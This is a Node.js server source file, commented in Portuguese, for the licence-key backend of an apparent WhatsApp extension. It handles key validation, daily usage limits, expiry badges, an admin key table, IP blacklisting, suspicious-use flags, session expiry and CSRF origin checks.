async function claimPortalEmailChange(db, email, { operationId, targetEmail, startedAt = new Date() } = {}) {
  const source = String(email || '').toLowerCase().trim();
  const target = String(targetEmail || '').toLowerCase().trim();
  const op = String(operationId || '').trim();
  if (!source || !target || !op) return false;
  const result = await db.collection('portal_users').updateOne(
    { _id: source, emailChangeOp: { $exists: false } },
    { $set: { emailChangeOp: op, emailChangeTarget: target, emailChangeStartedAt: new Date(startedAt) } }
  );
  return result?.matchedCount === 1;
}

async function releasePortalEmailChange(db, email, operationId) {
  const source = String(email || '').toLowerCase().trim();
  const op = String(operationId || '').trim();
  if (!source || !op) return false;
  const result = await db.collection('portal_users').updateOne(
    { _id: source, emailChangeOp: op },
    { $unset: { emailChangeOp: '', emailChangeTarget: '', emailChangeStartedAt: '' } }
  );
  return result?.matchedCount === 1;
}

async function finalizePortalEmailChange(db, email, operationId) {
  const source = String(email || '').toLowerCase().trim();
  const op = String(operationId || '').trim();
  if (!source || !op) return false;
  const result = await db.collection('portal_users').deleteOne({ _id: source, emailChangeOp: op });
  return result?.deletedCount === 1;
}

function isFreeAuthKey(key) {
  return key === FREE_AUTH_KEY;
}
function sanitizeKeyRecord(k) {
  if (!k || typeof k !== 'object') return k;
  if (!Array.isArray(k.activations)) k.activations = [];
  if (k.plan_id === FREE_PLAN_ID || k.plan_id === FREE_OWNER_ID) k.plan_id = 'ZV_PRO';
  if (k.planId === FREE_PLAN_ID || k.planId === FREE_OWNER_ID) k.planId = 'ZV_PRO';
  if (!k.isBasicPlan) {
    delete k.usageLimits;
    if (k.usage && typeof k.usage === 'object') {
      for (const t of USAGE_ITEM_TYPES) {
        if (k.usage[t] && typeof k.usage[t].max === 'number' && k.usage[t].max >= 0) {
          k.usage[t].max = -1;
        }
      }
    }
  }
  return k;
}
function normalizeProUsage(usage, k) {
  const isBasic = !!k?.isBasicPlan;
  for (const t of USAGE_ITEM_TYPES) {
    if (!usage[t]) usage[t] = { sent: 0, max: -1 };
    if (isBasic) {
      const customMax = k?.usageLimits?.[t]?.max;
      usage[t].max = typeof customMax === 'number'
        ? customMax
        : (FREE_USAGE_LIMITS[t]?.max ?? USAGE_LIMITS[t]?.max ?? -1);
    } else {
      usage[t].max = USAGE_LIMITS[t]?.max ?? -1;
    }
    if (typeof usage[t].sent !== 'number') usage[t].sent = 0;
  }
  return usage;
}
function unlimitedUsagePayload(sentSource) {
  const limits = cloneLimits(USAGE_LIMITS);
  if (sentSource && typeof sentSource === 'object') {
    for (const t of USAGE_ITEM_TYPES) {
      if (sentSource[t] && typeof sentSource[t].sent === 'number') {
        limits[t].sent = sentSource[t].sent;
      }
    }
  }
  return {
    limits,
    expires_at: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
    isExpired: false,
  };
}
function usageTodayKey() {
  return new Date().toISOString().slice(0, 10);
}
function cloneLimits(template) {
  return JSON.parse(JSON.stringify(template));
}
function ensureKeyUsage(key, defaultLimits) {
  if (!key.usage || typeof key.usage !== 'object') key.usage = cloneLimits(defaultLimits);
  if (key.usageDate !== usageTodayKey()) {
    for (const t of USAGE_ITEM_TYPES) {
      if (key.usage[t]) key.usage[t].sent = 0;
      else key.usage[t] = { sent: 0, max: defaultLimits[t]?.max ?? -1 };
    }
    key.usageDate = usageTodayKey();
  }
  return key.usage;
}
function ensureFreeUsage(phone) {
  const id = (phone && phone !== '-') ? String(phone).replace(/\D/g, '') : '_anon_';
  if (freeUsage.usageDate !== usageTodayKey()) {
    freeUsage = { usageDate: usageTodayKey(), byPhone: {} };
  }
  if (!freeUsage.byPhone[id]) freeUsage.byPhone[id] = cloneLimits(FREE_USAGE_LIMITS);
  return freeUsage.byPhone[id];
}
function findKeyCodeByPhone(keysMap, phone) {
  if (!phone || phone === '-') return null;
  const norm = String(phone).replace(/\D/g, '');
  for (const [code, k] of Object.entries(keysMap)) {
    if (!k || typeof k !== 'object') continue;
    const lastNorm = String(k.lastPhone || '').replace(/\D/g, '');
    if (k.lastPhone === phone || (norm && lastNorm === norm)) return code;
    if (Array.isArray(k.phones) && k.phones.some(p => p === phone || String(p).replace(/\D/g, '') === norm)) return code;
  }
  return null;
}
// Distingue "chave nao existe" de "nao deu para verificar" (banco fora do ar /
// queda de conexao). Tratar os dois como iguais desloga clientes de chave ATIVA
// a cada blip de rede — o logout so pode acontecer com certeza (ver /v3/key).
//   { found: true }                  -> chave existe e esta carregada em keys[]
//   { found: false, dbError: false } -> banco respondeu: a chave realmente nao existe
//   { found: false, dbError: true }  -> banco inacessivel: estado DESCONHECIDO
async function ensureKeyLoadedEx(keyCode) {
  if (!keyCode) return { found: false, dbError: false };
  if (keys[keyCode]) {
    sanitizeKeyRecord(keys[keyCode]);
    return { found: true, dbError: false };
  }
  try {
    const db = await getMongoDb();
    const doc = await db.collection('store').findOne({ _id: 'keys' });
    if (doc?.data?.[keyCode]) {
      keys[keyCode] = sanitizeKeyRecord(doc.data[keyCode]);
      return { found: true, dbError: false };
    }
    if (doc?.data && typeof doc.data === 'object') {
      const norm = keyCode.replace(/\s/g, '');
      for (const [code, val] of Object.entries(doc.data)) {
        if (code === keyCode || code.replace(/\s/g, '') === norm) {
          keys[code] = sanitizeKeyRecord(val);
          return { found: true, dbError: false };
        }
      }
    }
    return { found: false, dbError: false };   // consultado com sucesso: nao existe
  } catch (err) {
    // Cache em memoria salva a sessao quando o banco cai depois do 1o login
    if (keys[keyCode]) {
      sanitizeKeyRecord(keys[keyCode]);
      return { found: true, dbError: false };
    }
    console.error('[auth] banco inacessivel ao validar chave (nao desloga):', err.message);
    return { found: false, dbError: true };    // estado desconhecido
  }
}
// Compat: chamadas que so precisam do booleano continuam funcionando.
async function ensureKeyLoaded(keyCode) {
  return (await ensureKeyLoadedEx(keyCode)).found;
}
// Portal: a validade/status exibidos ao titular sempre vêm do registro persistido.
// ensureKeyLoadedEx é intencionalmente cache-first para fluxos legados da extensão,
// mas não serve para telas de conta: outra instância pode ter alterado a licença.
// Não sobrescrever `keys` aqui: um GET não deve competir com mutações em memória.
async function readPortalKeySnapshot(keyCode, deps = {}) {
  if (!keyCode) return null;
  const code = String(keyCode);
  if (!/^[a-z0-9_-]{1,64}$/i.test(code)) throw new Error('invalid_portal_key_code');
  const db = deps.db || await getMongoDb();
  const doc = await db.collection('store').findOne(
    { _id: 'keys' },
    { projection: { [`data.${code}`]: 1, _id: 0 } }
  );
  const stored = doc?.data?.[code];
  return stored && typeof stored === 'object'
    ? { ...sanitizeKeyRecord(cloneKeyRecordForCommit(stored)), code }
    : null;
}
async function adminGetKey(code) {
  // Consulta a fonte persistida mesmo que outra instância já tenha carregado
  // a mesma chave com um estado diferente.
  return readAdminKeySnapshot(code);
}
async function resolveUsageKey(body) {
  const authKey = (body.authKey || '').toLowerCase().slice(0, 32);
  const phone = body.phoneNumber || '';

  // A identidade/entitlement vem de chave real ou associação real de
  // telefone já persistida. planId/isBasic/managerId e qualquer outra flag
  // enviada pelo cliente são deliberadamente ignorados: antes bastava forjar
  // uma delas para cair no pseudo-key ilimitado __paid__.
  if (authKey === FREE_AUTH_KEY) return FREE_AUTH_KEY;

  if (authKey && authKey !== FREE_AUTH_KEY && await ensureKeyLoaded(authKey)) {
    return extensionLicenseIsUsable(keys[authKey]) ? authKey : null;
  }

  const byPhone = findKeyCodeByPhone(keys, phone);
  if (byPhone && await ensureKeyLoaded(byPhone) && extensionLicenseIsUsable(keys[byPhone])) return byPhone;

  return null;
}
function buildUsagePayload(keyCode, phone) {
  if (keyCode === FREE_AUTH_KEY) {
    const usage = ensureFreeUsage(phone || '');
    return {
      limits: usage,
      expires_at: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
      isExpired: false,
    };
  }
  if (keyCode === PAID_USAGE_KEY) {
    return unlimitedUsagePayload();
  }
  const k = keys[keyCode];
  if (!k) return null;
  sanitizeKeyRecord(k);
  if (!k.isBasicPlan) {
    return unlimitedUsagePayload(k.usage);
  }
  const usage = ensureKeyUsage(k, USAGE_LIMITS);
  normalizeProUsage(usage, k);
  return {
    limits: usage,
    expires_at: k.expiresAt || new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
    isExpired: isKeyExpired(k),
  };
}
function incrementUsageRow(usage, itemType, defaultLimits, scheduledItems) {
  if (!USAGE_ITEM_TYPES.includes(itemType)) {
    return { ok: false, errorType: 'UNKNOWN_ITEM_TYPE', message: 'Tipo de item desconhecido' };
  }
  if (!usage[itemType]) usage[itemType] = { sent: 0, max: defaultLimits[itemType]?.max ?? -1 };
  const row = usage[itemType];
  if (itemType === 'scheduleItem' && typeof scheduledItems === 'number') {
    row.sent = Math.max(row.sent || 0, scheduledItems);
  } else if (row.max === 0) {
    return { ok: false, errorType: 'MAX_LIMIT_REACHED', message: 'Recurso indisponível no plano gratuito' };
  } else if (row.max < 0) {
    row.sent = (row.sent || 0) + 1;
  } else if (row.sent >= row.max) {
    return { ok: false, errorType: 'MAX_LIMIT_REACHED', message: 'Limite diário atingido' };
  } else {
    row.sent = (row.sent || 0) + 1;
  }
  return { ok: true, limits: usage };
}
function getFreeAuthData() {
  return {
    numberWarning: false,
    segments: [],
    isLoggedIn: true,
    isPremium: false,
    isFreePlan: true,
    isBasicPlan: false,
    expiresAt: null,
    hoursLeft: null,
    daysLeft: null,
    expiringSoon: false,
    deferred: false,
    modules: { ...DEFAULT_MODULES },
    data: {
      key: FREE_AUTH_KEY,
      keyId: FREE_KEY_ID,
      ownerId: FREE_OWNER_ID,
      managerId: FREE_MANAGER_ID,
      permissions: [],
      username: 'Usuário Gratuito',
      paymentUrl: null,
      marketplace: 'free',
      email: '',
      planName: 'Gratuito',
      plan_id: FREE_PLAN_ID,
      isLoggedIn: true,
      isPremium: false,
      isBasicPlan: false,
      message: '',
      warnLimit: false,
      expiresAt: null,
    },
  };
}
function getAuthData(keyCode, userName) {
  const k = sanitizeKeyRecord(keys[keyCode] || {});
  const expiry = getKeyExpiryMeta(k);
  return {
    numberWarning: false,
    segments: Array.isArray(k.segments) ? k.segments : [],
    isLoggedIn: true,
    isPremium: !k.isBasicPlan,
    isFreePlan: false,
    isBasicPlan: !!k.isBasicPlan,
    expiresAt: expiry.expiresAt,
    hoursLeft: expiry.hoursLeft,
    daysLeft: expiry.daysLeft,
    expiringSoon: expiry.expiringSoon,
    deferred: expiry.deferred,
    modules: { ...DEFAULT_MODULES, ...(k.modules || {}) },
    data: {
      key: keyCode,
      keyId: k.keyId || `id-${keyCode}`,
      ownerId: k.ownerId || 'zv-owner',
      managerId: k.managerId || 'zv-manager',
      permissions: Array.isArray(k.permissions) && k.permissions.length ? k.permissions : FULL_PERMISSIONS,
      username: userName || k.label || '',
      paymentUrl: k.paymentUrl || null,
      marketplace: k.marketplace || 'premium',
      email: k.email || '',
      planName: k.planName || 'Pro',
      plan_id: (k.plan_id === FREE_PLAN_ID || k.plan_id === FREE_OWNER_ID)
        ? 'ZV_PRO'
        : (k.plan_id || k.planId || 'ZV_PRO'),
      isLoggedIn: true,
      isPremium: !k.isBasicPlan,
      isBasicPlan: !!k.isBasicPlan,
      message: '',
      warnLimit: false,
      expiresAt: expiry.expiresAt,
      hoursLeft: expiry.hoursLeft,
      daysLeft: expiry.daysLeft,
      expiringSoon: expiry.expiringSoon,
      deferred: expiry.deferred,
    },
  };
}
function isAllowedExtensionOrigin(origin, pathname) {
  return resolveExtensionCorsOrigin({
    origin,
    pathname,
    extensionIds: ZVM_EXTENSION_IDS,
    extensionRoot: R_EXT,
    legacyV3Allow: ZVM_LEGACY_V3_ALLOW,
  });
}

function isKeyExpired(k) {
  if (!k.expiresAt) return false;
  return new Date() > new Date(k.expiresAt);
}

function isKeyExpiringSoon(k) {
  if (!k.expiresAt || isKeyExpired(k)) return false;
  return (new Date(k.expiresAt) - new Date()) <= EXPIRY_WARN_HOURS * 3600000;
}

const _MONTHS_BR = ['JAN','FEV','MAR','ABR','MAI','JUN','JUL','AGO','SET','OUT','NOV','DEZ'];
function fmtShortDate(dateStr) {
  if (!dateStr) return '-';
  const d = new Date(dateStr);
  const tz = 'America/Sao_Paulo';
  const mo = _MONTHS_BR[parseInt(d.toLocaleString('en',{timeZone:tz,month:'numeric'}))-1];
  const day = d.toLocaleString('pt-BR',{timeZone:tz,day:'2-digit'});
  const hm = d.toLocaleString('pt-BR',{timeZone:tz,hour:'2-digit',minute:'2-digit'});
  return mo+'/'+day+', '+hm;
}
function hoursUntilExpiry(k) {
  if (!k.expiresAt) return null;
  return Math.max(0, Math.floor((new Date(k.expiresAt) - new Date()) / 3600000));
}
function daysUntilExpiry(k) {
  if (!k?.expiresAt) return null;
  return Math.max(0, Math.floor((new Date(k.expiresAt) - new Date()) / (24 * 3600000)));
}
function getKeyExpiryMeta(k) {
  const deferred = !!(k?.expireDuration && !k?.expiresAt);
  const expiresAt = k?.expiresAt || null;
  return {
    expiresAt,
    hoursLeft: expiresAt ? hoursUntilExpiry(k) : null,
    daysLeft: expiresAt ? daysUntilExpiry(k) : null,
    expiringSoon: expiresAt ? isKeyExpiringSoon(k) : false,
    deferred,
  };
}

function getKeyDisplayStatus(k) {
  if (isKeyExpired(k)) return 'expirada';
  if (!k.active) return 'bloqueado';
  if (k.expireDuration && !k.expiresAt) return 'aguardando';
  if (isKeyExpiringSoon(k)) return 'expirando';
  return 'ativo';
}

function renderKeyStatusBadge(k) {
  const st = getKeyDisplayStatus(k);
  const map = {
    ativo:      ['on',  'ATIVO'],
    bloqueado:  ['off', 'BLOQUEADO'],
    expirada:   ['off', 'EXPIRADA'],
    expirando:  ['wl',  'EXPIRANDO'],
    aguardando: ['vr',  'AGUARDANDO'],
  };
  const [cls, lbl] = map[st] || ['warn', st.toUpperCase()];
  return `<span class="badge ${cls}">${lbl}</span>`;
}

function getKeyValiditySortKey(k) {
  if (k.expiresAt) return new Date(k.expiresAt).getTime();
  if (k.expireDuration && !k.expiresAt) return Date.now() + 86400000 * 3650;
  return Number.MAX_SAFE_INTEGER;
}


const SUSPECT_CLEAR_MS = 172800000;
function dayAgoIso() { return new Date(Date.now() - 86400000).toISOString(); }
function recentKeyLogs(code) {
  const since = dayAgoIso();
  return logs.filter(l => l.keyCode === code && l.timestamp > since);
}
function getSuspectMeta(code, k) {
  const clearedAt = k?.suspectClearedAt ? new Date(k.suspectClearedAt) : null;
  if (clearedAt && (Date.now() - clearedAt.getTime()) < SUSPECT_CLEAR_MS) return { isSuspect: false, recentIpCount: 0 };
  const recentIps = new Set(recentKeyLogs(code).filter(l => l.ip).map(l => l.ip));
  return { isSuspect: recentIps.size > 3, recentIpCount: recentIps.size };
}
function isKeySuspect(code, k) { return getSuspectMeta(code, k).isSuspect; }

let _keyStatsCache = null;
// Estatísticas do mapa canônico de chaves, com cache curto.
function getKeyStats(snapshot = keys) {
  const useCache = snapshot === keys;
  if (useCache && _keyStatsCache) return _keyStatsCache;
  const all = Object.values(snapshot);
  const stats = {
    totalKeys:   Object.keys(snapshot).length,
    activeKeys:  all.filter(x => x.active && !isKeyExpired(x)).length,
    expiredKeys: all.filter(x => isKeyExpired(x)).length,
    warnKeys:    all.filter(x => x.active && isKeyExpiringSoon(x)).length,
    suspectKeys: Object.entries(snapshot).filter(([code, x]) => isKeySuspect(code, x)).length,
    blockedKeys: all.filter(x => !x.active && !isKeyExpired(x) && !(!x.expiresAt && x.expireDuration)).length,
    deferredKeys: all.filter(x => !x.expiresAt && x.expireDuration).length,
    totalLogs:   logs.length,
  };
  if (useCache) _keyStatsCache = stats;
  return stats;
}

let _keysHtmlCache = null, _keysHtmlCacheTs = 0;
const _KEYS_CACHE_TTL = 15000;
function invalidateKeysHtmlCache() { _keysHtmlCache = null; _keysHtmlCacheTs = 0; _keyStatsCache = null; }

function formatValidityCell(k) {
  const expired = isKeyExpired(k), warnSoon = isKeyExpiringSoon(k);
  if (!k.expiresAt && k.expireDuration) {
    const d = Math.floor(k.expireDuration / 86400000), h = Math.floor((k.expireDuration % 86400000) / 3600000);
    const parts = []; if (d > 0) parts.push(d+'d'); if (h > 0) parts.push(h+'h');
    return `<span class="badge" style="background:#4f8ef722;color:var(--blue);border:1px solid #4f8ef744">⏱ Ao 1º uso</span><br><span style="font-size:12px;color:var(--muted)">${parts.join(' ') || '—'}</span>`;
  }
  if (!k.expiresAt) return `<span class="badge on" style="opacity:.85">∞ Sem expiração</span>`;
  const exp = new Date(k.expiresAt);
  const expStr = fmtShortDate(k.expiresAt);
  if (expired) return `<span class="badge off">EXPIRADA</span><br><span style="font-size:12px;color:var(--red)">${expStr}</span>`;
  const diffH = hoursUntilExpiry(k), diffD = daysUntilExpiry(k);
  const remain = diffH < 1 ? Math.max(0, Math.floor((exp - Date.now()) / 60000)) + ' min' : diffH < 24 ? diffH + ' h' : diffD + 'd' + (diffH % 24 ? ' ' + (diffH % 24) + 'h' : '');
  return `<span class="badge ${warnSoon?'wl':'on'}" style="${warnSoon?'':'background:#00ff8722;color:var(--green);border:1px solid #00ff8744'}">${remain} restantes</span><br><span style="font-size:12px;color:${warnSoon?'var(--orange)':'var(--green)'}">até ${expStr}</span>`;
}

// Renderiza a tabela a partir do mapa canônico de chaves.
function buildKeysHtml(snapshot = keys) {
  const _keys = snapshot;
  const _logs = logs;
  const entries = Object.entries(_keys);
  if (!entries.length) return `<tr><td colspan="12" class="empty">Nenhuma chave cadastrada</td></tr>`;
  const logByKey = new Map();
  for (const l of _logs) { if (!l.keyCode) continue; if (!logByKey.has(l.keyCode)) logByKey.set(l.keyCode, []); logByKey.get(l.keyCode).push(l); }
  return entries.map(([code, k]) => {
    const expired = isKeyExpired(k), warnSoon = isKeyExpiringSoon(k);
    const keyLogs = logByKey.get(code) || [];
    const uniqueIps = new Set(keyLogs.filter(l => l.ip).map(l => l.ip)).size;
    const { isSuspect, recentIpCount } = getSuspectMeta(code, k);
    const rowStyle = isSuspect ? ' style="background:#ff000008;outline:1px solid #ff475720"' : warnSoon && !expired ? ' style="background:#ff860010"' : '';
    const suspectBadge = isSuspect ? `<span title="${recentIpCount} IPs nas últimas 24h" style="color:#ff4757;font-size:13px;margin-left:4px">⚠ SUSPEITA</span>` : '';
    const deferredAttr = (!k.expiresAt && k.expireDuration) ? '1' : '0';
    const dispStatus = getKeyDisplayStatus(k);
    return `<tr class="key-record" data-code="${escHtml(code)}" data-expires-at="${escHtml(k.expiresAt||'')}" data-deferred="${deferredAttr}" data-validity="${getKeyValiditySortKey(k)}" data-label="${escHtml(String(k.label||'').toLowerCase())}" data-phone="${escHtml(k.lastPhone||'')}" data-status="${dispStatus}" data-uses="${k.uses||0}" data-phones-count="${(k.phones||[]).length}" data-created="${k.createdAt||''}" data-lastused="${escHtml(k.lastUsed||'')}" data-suspect="${isSuspect?'1':''}" data-plan="${escHtml((k.planId||k.plan_id||'pro').toLowerCase())}"` + rowStyle + `>
  <td data-field="Chave"><span style="display:flex;align-items:center;gap:6px"><input type="checkbox" class="key-cb" style="cursor:pointer;width:13px;height:13px;flex-shrink:0"><span class="kc" title="Clique para copiar" style="cursor:pointer">${escHtml(code)}</span><button type="button" class="key-mobile-details" aria-expanded="false" onclick="toggleKeyDetails(this)">Detalhes</button></span></td>
  <td data-field="Cliente">${escHtml(k.label)}${suspectBadge}</td>
  <td data-field="Status">${renderKeyStatusBadge(k)}</td>
  <td data-field="Validade">${formatValidityCell(k)}</td>
  <td data-field="Usos"><span style="color:${((k.phones||[]).length>=(k.maxUses>0?k.maxUses:MAX_USES)&&(k.maxUses>0?k.maxUses:MAX_USES)>0)?'var(--orange)':'inherit'}">${(k.phones||[]).length}/${k.maxUses===-1?'&#x221E;':(k.maxUses>0?k.maxUses:MAX_USES)}</span></td>
  <td data-field="Telefone">${escHtml(k.lastPhone||'-')}</td>
  <td data-field="Último IP" class="key-extra-data" title="${uniqueIps} IPs únicos">${escHtml(k.lastIp||'-')} ${uniqueIps>1?`<span style="color:var(--muted);font-size:13px">(+${uniqueIps-1})</span>`:''}</td>
  <td data-field="Último acesso" class="key-extra-data">${fmtShortDate(k.lastUsed||null)}</td>
  <td data-field="Criada em" class="key-extra-data">${fmtShortDate(k.createdAt||null)}</td>
  <td data-field="Origem" class="key-extra-data">${renderTrackingChips(k)}</td>
  <td data-field="Nota" class="note-cell key-extra-data" data-code="${escHtml(code)}" data-note="${escHtml(k.note||'')}"><span class="note-preview">${escHtml(k.note||'')||'<span style="color:var(--muted)">—</span>'}</span></td>
  <td data-field="Ações" class="key-actions-cell"><div class="acts">
    <button class="bs bg" onclick="openRenew('${escHtml(code)}','${escHtml(k.label||'')}')">Tempo</button>
    <button class="bs bg" onclick="openEditUses('${escHtml(code)}','${escHtml(k.label||'')}',${Number.isFinite(k.maxUses)?k.maxUses:MAX_USES})">Usos</button>
    <button type="button" class="bs bw key-more-trigger" aria-controls="zvm-actions-${escHtml(code)}" aria-expanded="false" aria-label="Mais ações da licença" onclick="this.nextElementSibling.hidden=false;toggleKeyActionMenu(this)">•••</button><div id="zvm-actions-${escHtml(code)}" class="key-actions-popover" popover="auto" hidden>
      <button class="bs ${k.active?'bd':'bg'}" onclick="toggleKey('${escHtml(code)}')">${k.active?'Bloquear':'Liberar'}</button>
      <button class="bs bg" onclick="openRename('${escHtml(code)}','${escHtml(k.label||'')}')">Renomear</button>
      ${(k.phones||[]).length>0?`<button class="bs bd" onclick="openPhones('${escHtml(code)}','${escHtml(k.label||'')}')">Números</button>`:''}
      <label class="bs ${k.devAccess===true?'bg':'bw'}" title="Acesso DEV: autoriza builds DEV assinadas" style="display:inline-flex;align-items:center;gap:5px;cursor:pointer"><input type="checkbox" class="dev-access-switch" ${k.devAccess===true?'checked':''} onchange="toggleDevAccess('${escHtml(code)}',this.checked,this)" style="accent-color:var(--g);width:13px;height:13px;margin:0"> Acesso DEV</label>
      <button class="bs bd" onclick="deleteKey('${escHtml(code)}')">Excluir</button>
      ${isSuspect?`<button class="bs bsusp" onclick="clearSuspect('${escHtml(code)}')">🕵️ Suspeita</button>`:''}
    </div></div></td>
</tr>`;
  }).join('');
}
function getKeysHtmlCached() {
  const now = Date.now();
  if (_keysHtmlCache && (now - _keysHtmlCacheTs) < _KEYS_CACHE_TTL) return _keysHtmlCache;
  _keysHtmlCache = buildKeysHtml(); _keysHtmlCacheTs = now;
  return _keysHtmlCache;
}
function buildLogsHtml(arr) {
  const src = arr ?? logs;
  if (!src.length) return `<tr><td colspan="7" class="empty">Nenhum log ainda</td></tr>`;
  return src.slice(0, 200).map(l => `<tr>
  <td>${new Date(l.timestamp).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo'})}</td>
  <td><span class="kc" style="font-size:13px">${escHtml(l.keyCode||'-')}</span></td>
  <td>${escHtml(l.label||'-')}</td>
  <td>${escHtml(l.phone||'-')}</td>
  <td>${escHtml(l.ip||'-')}</td>
  <td>${escHtml(l.wppVersion||'-')}</td>
  <td><span class="badge ${logActionBadgeClass(l.action)}">${escHtml(l.action)}</span></td>
</tr>`).join('');
}

function parseKeyExpiryFromBody(body, { allowMinutes = false } = {}) {
  if (body.expiresAt) {
    return { expiresAt: new Date(body.expiresAt).toISOString(), expireDuration: null };
  }
  const days = parseInt(body.expireDays || 0);
  const hours = parseInt(body.expireHours || 0);
  const minutes = allowMinutes ? parseInt(body.expireMinutes || 0) : 0;
  if (!days && !hours && !minutes) return { expiresAt: null, expireDuration: null };
  const durationMs = ((days * 1440) + (hours * 60) + minutes) * 60000;
  if (body.deferred) return { expiresAt: null, expireDuration: durationMs };
  return { expiresAt: new Date(Date.now() + durationMs).toISOString(), expireDuration: null };
}

function removePhoneFromKey(k, rawPhone) {
  const phone = normalizePhone(rawPhone);
  const lastPhoneMatches = k.lastPhone && normalizePhone(k.lastPhone) === phone;
  k.phones = (k.phones || []).filter(p => normalizePhone(p) !== phone);
  k.uses = k.phones.length;
  if (lastPhoneMatches) k.lastPhone = k.phones.at(-1) || null;
  k.activations = (k.activations || []).filter(a => normalizePhone(a?.phone) !== phone);
}

function clearAllPhonesFromKey(k) {
  k.phones = [];
  k.uses = 0;
  k.lastPhone = null;
  k.activations = [];
}

function resolvePhoneToRemove(phones, { phoneIdx, phoneTxt }) {
  if (phoneIdx >= 0 && phoneIdx < phones.length) return phones[phoneIdx];
  if (phoneTxt) {
    const digits = phoneTxt.replace(/[^0-9]/g, '');
    return phones.find(p => p === phoneTxt || (digits && p.endsWith(digits))) || null;
  }
  return null;
}

function logActionBadgeClass(action) {
  if (action === 'login_ok') return 'on';
  if (action === 'relogin_ok') return 're';
  if (action === 'login_blocked') return 'off';
  if (action === 'warn_limit') return 'wl';
  return 'warn';
}

function normalizeClientIp(value) {
  let raw = String(value || '').trim();
  if (raw.startsWith('[') && raw.endsWith(']')) raw = raw.slice(1, -1);
  const mapped = /^::ffff:(\d{1,3}(?:\.\d{1,3}){3})$/i.exec(raw);
  if (mapped && net.isIP(mapped[1]) === 4) return mapped[1];
  const family = net.isIP(raw);
  if (family === 4) return raw;
  if (family !== 6) return '';
  try {
    const host = new URL('http:' + `//[${raw}]/`).hostname;
    return host.slice(1, -1).toLowerCase();
  } catch (_) {
    return raw.toLowerCase();
  }
}
function replaceIpBlacklist(values) {
  ipBlacklist.clear();
  for (const raw of Array.isArray(values) ? values : []) {
    const ip = normalizeClientIp(raw);
    if (ip) ipBlacklist.add(ip);
    if (ipBlacklist.size >= 5000) break;
  }
  return [...ipBlacklist];
}
function isIpBlacklisted(value) {
  const ip = normalizeClientIp(value);
  return !!ip && ipBlacklist.has(ip);
}
function getIp(req) {
  return resolveClientIp({
    headers: req.headers || {},
    remoteAddress: req.socket?.remoteAddress || '',
    trustProxyHeaders: TRUST_PROXY_HEADERS,
    isRender: String(process.env.RENDER || '').toLowerCase() === 'true',
    normalize: normalizeClientIp,
  });
}

// Limite absoluto pra sessões privilegiadas (admin/analytics — NÃO o
// portal do cliente). O timeout de inatividade (sliding, 8h) continua
// existindo, mas sozinho ele deixava uma sessão viver indefinidamente
// contanto que alguém continuasse usando — um cookie roubado/vazado
// permanecia válido pra sempre. 24h é conservador o bastante pra não
// atrapalhar um turno de trabalho normal do admin/analytics, mas força
// login de novo pelo menos uma vez por dia. Deliberadamente NÃO vinculado
// a IP: troca legítima de rede (wifi -> 4G, VPN) não deve derrubar sessão.
const SESSION_ABSOLUTE_LIMIT_MS = 24 * 60 * 60 * 1000;

function isAdminSession(req) {
  const cookie = req.headers.cookie || '';
  const match  = cookie.match(/zv_admin=([a-f0-9]+)/);
  if (!match) return false;
  const s = sessions[match[1]];
  if (!s) return false;
  if (new Date() > new Date(s.expiresAt)) { delete sessions[match[1]]; return false; }
  if (s.absoluteExpiresAt && new Date() > new Date(s.absoluteExpiresAt)) { delete sessions[match[1]]; return false; }
  // Sliding expiry: renova por mais 8h a cada acesso autenticado
  s.expiresAt = new Date(Date.now() + 8 * 60 * 60 * 1000).toISOString();
  return true;
}

function getAdminSession(req) {
  const match = (req.headers.cookie || '').match(/zv_admin=([a-f0-9]+)/);
  return match ? sessions[match[1]] : null;
}

// Revoga todas as sessões de portal de um e-mail. Chamado após troca/reset de senha:
// sem isto, a sessão de quem invadiu a conta continua válida por até 24h mesmo depois
// da vítima trocar a senha — a troca não expulsa o invasor.
function revokePortalSessions(email, keepToken) {
  const target = String(email || '').toLowerCase();
  if (!target) return 0;
  let n = 0;
  for (const [tok, s] of Object.entries(portalSessions)) {
    if (tok === keepToken) continue;
    if (String(s?.email || '').toLowerCase() === target) { delete portalSessions[tok]; n++; }
  }
  return n;
}

function isPortalSession(req) {
  const m = (req.headers.cookie||'').match(/zv_portal=([a-f0-9]+)/);
  if (!m) return false;
  const s = portalSessions[m[1]];
  return s && !s.pending2fa && new Date() < new Date(s.expiresAt);
}
function getPortalUser(req) {
  const m = (req.headers.cookie||'').match(/zv_portal=([a-f0-9]+)/);
  return m ? portalSessions[m[1]] : null;
}

function _sanitizeRequestTraceId(value) {
  const s = String(value || '').trim();
  return /^[A-Za-z0-9][A-Za-z0-9._:-]{0,127}$/.test(s) ? s : '';
}

function getOrCreateRequestId(req) {
  const headers = req && req.headers ? req.headers : {};
  return _sanitizeRequestTraceId(headers['rndr-id']) || crypto.randomUUID();
}

function applyRequestContext(req, res) {
  const id = getOrCreateRequestId(req);
  req.zvmRequestId = id;
  const cfRay = _sanitizeRequestTraceId(req.headers && req.headers['cf-ray']);
  if (cfRay) req.zvmCfRay = cfRay;
  try { res.setHeader('X-Request-Id', id); } catch (_) {}
  return id;
}

// Defesa em profundidade contra CSRF nos POSTs autenticados via cookie
// (portal/admin/analytics). SameSite=Strict já bloqueia a esmagadora
// maioria dos casos; isto cobre navegadores antigos/extensões que não
// respeitam SameSite. NÃO aplicar ao webhook externo da Cakto
// nem a APIs de extensão — esses são legitimamente cross-origin.
function requireSameOriginPost(req) {
  const site = String(req.headers['sec-fetch-site'] || '').toLowerCase();
  if (site) return site === 'same-origin' || site === 'none';
  const hostOf = (h) => { try { return new URL(h).host; } catch { return ''; } };
  const expectedHost = req.headers.host || '';
  if (!expectedHost) return false;
  const origin = req.headers.origin;
  if (origin) return hostOf(origin) === expectedHost;
  const referer = req.headers.referer;
  if (referer) return hostOf(referer) === expectedHost;
  return false;
}

function isAnalyticsSession(req) {
  const cookie = req.headers.cookie || '';
  const match  = cookie.match(/zv_an=([a-f0-9]+)/);
  if (!match) return false;
  const s = analyticsSessions[match[1]];
  if (!s) return false; // sessão não encontrada (servidor reiniciado) — cookie inválido
  if (new Date() > new Date(s.expiresAt)) { delete analyticsSessions[match[1]]; return false; }
  if (s.absoluteExpiresAt && new Date() > new Date(s.absoluteExpiresAt)) { delete analyticsSessions[match[1]]; return false; }
  return true;
}
// ── Cookies de sessão autenticada (portal/admin/analytics) ──────────────
